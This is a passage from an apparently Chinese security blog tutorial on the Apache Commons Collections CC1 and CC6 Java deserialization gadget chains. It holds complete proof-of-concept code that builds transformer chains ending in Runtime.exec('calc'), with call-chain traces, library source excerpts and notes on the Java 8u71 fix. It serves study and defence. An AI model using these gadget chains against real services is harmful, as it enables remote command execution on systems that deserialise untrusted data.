class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>),<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        inner.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>);<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(inner,transformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clzz</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span>  <span class="hljs-operator">=</span> clzz.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">Handler</span> <span class="hljs-operator">=</span>(InvocationHandler) constructor.newInstance(Retention.class,outer);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">myMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(HashMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,Handler);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">serHandler</span> <span class="hljs-operator">=</span>(InvocationHandler) constructor.newInstance(Retention.class,myMap);<br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(serHandler);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC1.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730163529689.png" alt="image-20220730163529689"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>                <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>CC1我个人觉得是CC链中最具有代表性的一条链，但是作为最开始的反序列化链，它本身是具有很大的局限性的。</p><p>在Java 8u71以及之后的版本，这条链是无法使用的。官方对其的修复是修改了<code>AnnotationInvocationHandler</code>的readObject方法。</p><p>不再使用放入 <code>AnnotationInvocationHandler</code>中的LazyMap，而是重新创建了一个LinkdHashMap对其进行操作。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730165445880.png" alt="image-20220730165445880"></p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><blockquote><p>CommonsCollections 3.1 - 3.2.1</p><p>JDK无限制</p></blockquote><p>高版本下CC1无法使用，那么就不得不提一下，和CC1一脉相承的CC6。</p><p>CC1-7中CC6是和CC1最为相似的，也是适用范围相对广泛的。</p><h3 id="POC构造-1"><a href="#POC构造-1" class="headerlink" title="POC构造"></a>POC构造</h3><p>CC6和CC1在LazyMap之后调用链完全一致，区别就在于触发 <code>LazyMap.get</code> 的方式不同。</p><p>在CC6中使用了一个新的类来触发LazyMap的get方法</p><h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TiedMapEntry</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Map</span>.Entry, KeyValue, Serializable &#123;<br>...<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Map map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object key;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> &#123;<br>        <span class="hljs-built_in">this</span>.map = map;<br>        <span class="hljs-built_in">this</span>.key = key;<br>    &#125;<br>...<br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.map.get(<span class="hljs-built_in">this</span>.key);<span class="hljs-comment">//此处调用了get方法，若this.map为设计好的LazyMap就可以链接起后段的调用链。</span><br>    &#125;<br>...<br> <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<span class="hljs-comment">//这里调用了本身的getValue方法</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个类里的<code>getValue</code>方法会调用其内部的一个Map变量的<code>get</code>方法，而在其的<code>hashCode</code>方法中有调用了<code>getValue</code>方法，所以只要触发了<code>hashCode</code>方法就可联动之后的调用链执行命令。</p><p>先将 LazyMap放入其中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outer,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>要计算HashCode很容易就联想到 HashMap.readObject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br>        s.defaultReadObject();<br>        reinitialize();<br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <span class="hljs-comment">// (if zero, use defaults)</span><br>            <span class="hljs-comment">// Size the table using given load factor only if within</span><br>            <span class="hljs-comment">// range of 0.25...4.0</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>                Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<span class="hljs-comment">//此处会计算key的hash</span><br>            &#125;<br>        &#125;<br>    &#125;<br>...<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<span class="hljs-comment">//调用key的hashcode方法</span><br>    &#125;<br></code></pre></td></tr></table></figure><p><code>HashMap.readObject</code>会遍历整个Map并尝试重新计算key的hashCode。所以只需要将上面构造好的的<code>TiedMapEntry</code>作为一个key放入HashMap中就可以触发后面的调用链。</p><p>所以将 构造好的 <code>TiedMapEntry</code>放入一个HashMap中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">HashMap</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>unser.put(tMap,<span class="hljs-string">&quot;key&quot;</span>);<br></code></pre></td></tr></table></figure><p>这样整个调用链就清楚了，不过运行时会出现一个问题，计算器在序列化之前就弹出来了。</p><p>这是因为<code>HashMap.put</code>方法也会尝试计算 key的hashCode。所以我们精心构造的LazyMap就在put的时候被触发了，而LazyMap的get方法只会在找不到key的时候才会调用<code>transform()</code>，并且在调用之后将key添加进去，第二次get相同的key就不会在调用<code>transform()</code>了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">super</span>.map.containsKey(key)) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.factory.transform(key);<br>            <span class="hljs-built_in">super</span>.map.put(key, value);<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.map.get(key);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到在put之后LazyMap多了一对key-value</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730174235635.png" alt="image-20220730174235635"></p><p>所以为了保证反序列化时能正常触发，我们需要手动将LazyMap中的条目给移除掉。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">outer.remove(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><blockquote><p>但是这样可以正常运行了，不过在反序列化之前还是会触发一次调用链，可以先往LazyMap中放入一个无用的 tranforms，put之后再通过反射修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">&gt;<span class="hljs-type">Field</span> <span class="hljs-variable">trans</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>&gt;trans.setAccessible(<span class="hljs-literal">true</span>);<br>&gt;trans.set(transformer,transformers);<br></code></pre></td></tr></table></figure></blockquote><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>),<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(inner,transformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outer,<span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">unser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        unser.put(tMap,<span class="hljs-string">&quot;key&quot;</span>);<br><br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">trans</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        trans.setAccessible(<span class="hljs-literal">true</span>);<br>        trans.set(transformer,transformers);<br>        outer.remove(<span class="hljs-number">1</span>);<br><br><br><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">File</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./CC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(File);<br>        out.writeObject(unser);<br><br><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./CC6.ser&quot;</span>);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(ser);<br>        Object test=  in.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20220730174932095.png" alt="image-20220730174932095"></p><p>调用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br>java.io.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        java.util.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span 